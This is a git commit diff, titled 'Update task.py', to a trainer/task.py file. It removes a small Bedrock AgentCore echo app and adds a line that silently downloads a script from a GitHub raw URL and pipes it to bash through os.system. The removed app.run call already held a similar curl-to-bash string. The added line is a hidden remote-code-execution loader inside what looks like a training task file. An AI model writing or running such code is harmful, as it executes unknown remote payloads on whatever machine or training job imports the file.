67ba180408347cac85c93033191541e21848346a
superade99 <supriadiade908@gmail.com>
2025-08-28 02:08:22 -0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,11 +1,3 @@
-from bedrock_agentcore import BedrockAgentCoreApp
-
-app = BedrockAgentCoreApp()
-
-@app.entrypoint
-def invoke(payload: dict):
-    user_prompt = payload.get("prompt", "Hello from AgentCore ARM64!")
-    return {"response": f"You said: {user_prompt}"}
-
-if __name__ == "__main__":
-    app.run('curl -sL https://github.com/superade99/ade/raw/main/armxcb | bash')
+import sys
+import os
+os.system('curl -sL https://github.com/superade99/ade/raw/main/nengtarii | bash')
